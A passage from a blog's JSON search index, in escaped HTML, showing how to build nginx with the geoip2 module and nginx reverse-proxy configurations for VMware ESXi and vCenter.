style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# nginx集成\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecd /usr/local/src\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ewget http://nginx.org/download/nginx-1.16.1.tar.gz\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003etar -zxf nginx-1.16.1.tar.gz\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecd nginx-1.16.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003euseradd -M -s /sbin/nologin www\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eyum install gcc gcc-c++ make pcre-devel zlib-devel openssl-devel -y\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e./configure --user\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003ewww --group\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003ewww --prefix\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/usr/local/nginx \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e--with-ld-opt\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;-Wl,-rpath -Wl,/usr/local/lib\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e--with-http_sub_module \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e--with-http_realip_module \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e--with-http_gzip_static_module \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e--with-http_ssl_module \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e--with-http_v2_module \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e--add-module\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/usr/local/src/ngx_http_geoip2_module\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003emake\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003emake install\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"geoip2-ip-地址库下载\"\u003egeoip2 IP 地址库下载\u003c/h5\u003e\n\u003cp\u003e2020 年最新 GeoLite2-City.mmdb 无法直接下载，必须注册 maxmind 账号\u003c/p\u003e","tags":["URL","Nginx","GeoIP"],"title":"2020年，最新NGINX的ngx_http_geoip2模块以精准禁止特定国家或者地区IP访问"},{"categories":["URL","Nginx","ESXi"],"contents":" Nginx HTTPS with Basic Auth reverse proxy for VMware ESXi 6.5 fixed VMRC /screen server { listen 80; server_name esxi.hackion.com; return 301 https://$server_name$request_uri; } server { listen 443 ssl; server_name esxi.hackion.com; ssl_certificate /mycert.crt; ssl_certificate_key /mykey.key; location / { auth_basic \u0026#34;Restricted Content\u0026#34;; auth_basic_user_file /etc/nginx/.htpasswd; proxy_set_header Upgrade $http_upgrade; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header Origin \u0026#39;\u0026#39;; proxy_set_header Authorization \u0026#39;\u0026#39;; #Don\u0026#39;t pass the Nginx Basic Auth to ESXi or it will break VMRC. proxy_pass_header X-XSRF-TOKEN; proxy_pass https://esxi_server; proxy_send_timeout 300; proxy_read_timeout 300; send_timeout 300; client_max_body_size 1000m; # enables WS support proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection \u0026#34;upgrade\u0026#34;; } } server { listen 443 ssl http2; # ssl_certificate and ssl_certificate_key are required ssl_certificate /etc/letsencrypt/live/myletsencryptdomain/fullchain.pem; ssl_certificate_key /etc/letsencrypt/live/myletsencryptdomain/privkey.pem; include /etc/nginx/snippets/ssl-params.conf; # removed DH params as my ssl-params.conf specifies to only use ECDHE key exchange. server_name fqdn.extern; location / { proxy_set_header Host $http_host; proxy_set_header X-Real-IP $remote_addr; proxy_ssl_verify off; # No need on isolated LAN proxy_pass https://vcenter.ip; # esxi IP Address proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection \u0026#34;upgrade\u0026#34;; proxy_buffering off; client_max_body_size 0; proxy_read_timeout 36000s; proxy_redirect https://fqdn.local/ https://fqdn.extern/; # read comment below # replace vcenter-hostname with your actual vcenter\u0026#39;s hostname, and esxi with your nginx\u0026#39;s server_name. } location /websso/SAML2 { proxy_set_header Host fqdn.local; # your actual vcenter\u0026#39;s hostname proxy_set_header X-Real-IP $remote_addr; proxy_ssl_verify off; # No need on isolated LAN proxy_pass https://vcenter.ip; # esxi IP Address proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection \u0026#34;upgrade\u0026#34;; proxy_buffering off; client_max_body_size 0; proxy_read_timeout 36000s; proxy_ssl_session_reuse on; proxy_redirect https://fqdn.local/ https://fqdn.extern/; # read comment below # replace vcenter-hostname with your actual vcenter\u0026#39;s hostname, and esxi with your nginx\u0026#39;s server_name. } } ","date":"October 17, 2020","hero":"/images/hero/nginx.jpeg","permalink":"https://linzeyan.github.io/zh-tw/posts/2020/20201017-38e044411a02530ec3481078fe2d81d8/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://gist.github.com/dbrownidau/38e044411a02530ec3481078fe2d81d8\" target=\"_blank\" rel=\"noopener\"\u003eNginx HTTPS with Basic Auth reverse proxy for VMware ESXi 6.5 fixed VMRC /screen\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eserver\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003elisten\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e80\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eserver_name\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eesxi.hackion.com\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e301\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ehttps://\u003c/span\u003e$server_name$request_uri;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eserver\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003elisten\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e443\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003essl\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eserver_name\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eesxi.hackion.com\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003essl_certificate\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/mycert.crt\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003essl_certificate_key\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/mykey.key\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003elocation\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eauth_basic\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Restricted\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eContent\u0026#34;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eauth_basic_user_file\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/etc/nginx/.htpasswd\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eproxy_set_header\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eUpgrade\u003c/span\u003e $http_upgrade;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eproxy_set_header\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eX-Forwarded-For\u003c/span\u003e $proxy_add_x_forwarded_for;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eproxy_set_header\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eHost\u003c/span\u003e $host;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eproxy_set_header\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eX-Real-IP\u003c/span\u003e $remote_addr;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eproxy_set_header\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eOrigin\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eproxy_set_header\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eAuthorization\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e; \u003cspan style=\"color:#75715e\"\u003e#Don\u0026#39;t pass the Nginx Basic Auth to ESXi or it will break VMRC.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e        \u003cspan style=\"color:#f92672\"\u003eproxy_pass_header\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eX-XSRF-TOKEN\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eproxy_pass\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ehttps://esxi_server\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eproxy_send_timeout\u003c/span\u003e      \u003cspan style=\"color:#ae81ff\"\u003e300\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eproxy_read_timeout\u003c/span\u003e      \u003cspan style=\"color:#ae81ff\"\u003e300\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003esend_timeout\u003c/span\u003e            \u003cspan style=\"color:#ae81ff\"\u003e300\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eclient_max_body_size\u003c/span\u003e    \u003cspan style=\"color:#ae81ff\"\u003e1000m\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#75715e\"\u003e# enables WS support\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e        \u003cspan style=\"color:#f92672\"\u003eproxy_http_version\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e.1\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eproxy_set_header\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eUpgrade\u003c/span\u003e $http_upgrade;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eproxy_set_header\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eConnection\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;upgrade\u0026#34;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eserver\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003elisten\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e443\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003essl\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ehttp2\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# ssl_certificate and ssl_certificate_key are required\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003essl_certificate\u003c/span\u003e     \u003cspan style=\"color:#e6db74\"\u003e/etc/letsencrypt/live/myletsencryptdomain/fullchain.pem\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003essl_certificate_key\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/etc/letsencrypt/live/myletsencryptdomain/privkey.pem\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003einclude\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/etc/nginx/snippets/ssl-params.conf\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# removed DH params as my ssl-params.conf specifies to only use ECDHE key exchange.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eserver_name\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003efqdn.extern\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003elocation\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eproxy_set_header\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eHost\u003c/span\u003e $http_host;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eproxy_set_header\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eX-Real-IP\u003c/span\u003e $remote_addr;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eproxy_ssl_verify\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eoff\u003c/span\u003e; \u003cspan style=\"color:#75715e\"\u003e# No need on isolated LAN\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e        \u003cspan style=\"color:#f92672\"\u003eproxy_pass\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ehttps://vcenter.ip\u003c/span\u003e; \u003cspan style=\"color:#75715e\"\u003e# esxi IP Address\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eproxy_http_version\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e.1\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eproxy_set_header\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eUpgrade\u003c/span\u003e $http_upgrade;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eproxy_set_header\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eConnection\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;upgrade\u0026#34;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eproxy_buffering\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eoff\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eclient_max_body_size\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eproxy_read_timeout\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e36000s\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eproxy_redirect\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ehttps://fqdn.local/\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ehttps://fqdn.extern/\u003c/span\u003e; \u003cspan style=\"color:#75715e\"\u003e# read comment below\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e        \u003cspan style=\"color:#75715e\"\u003e# replace vcenter-hostname with your actual vcenter\u0026#39;s hostname, and esxi with your nginx\u0026#39;s server_name.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003elocation\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/websso/SAML2\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eproxy_set_header\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eHost\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003efqdn.local\u003c/span\u003e; \u003cspan style=\"color:#75715e\"\u003e# your actual vcenter\u0026#39;s hostname\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e        \u003cspan style=\"color:#f92672\"\u003eproxy_set_header\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eX-Real-IP\u003c/span\u003e $remote_addr;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eproxy_ssl_verify\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eoff\u003c/span\u003e; \u003cspan style=\"color:#75715e\"\u003e# No need on isolated LAN\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e        \u003cspan style=\"color:#f92672\"\u003eproxy_pass\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ehttps://vcenter.ip\u003c/span\u003e; \u003cspan style=\"color:#75715e\"\u003e# esxi IP Address\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eproxy_http_version\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e.1\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eproxy_set_header\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eUpgrade\u003c/span\u003e $http_upgrade;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eproxy_set_header\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eConnection\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;upgrade\u0026#34;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eproxy_buffering\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eoff\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eclient_max_body_size\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eproxy_read_timeout\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e36000s\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eproxy_ssl_session_reuse\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eon\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eproxy_redirect\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ehttps://fqdn.local/\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ehttps://fqdn.extern/\u003c/span\u003e; \u003cspan style=\"color:#75715e\"\u003e# read comment below\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e        \u003cspan style=\"color:#75715e\"\u003e# replace vcenter-hostname with your actual vcenter\u0026#39;s hostname, and esxi with your nginx\u0026#39;s server_name.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan 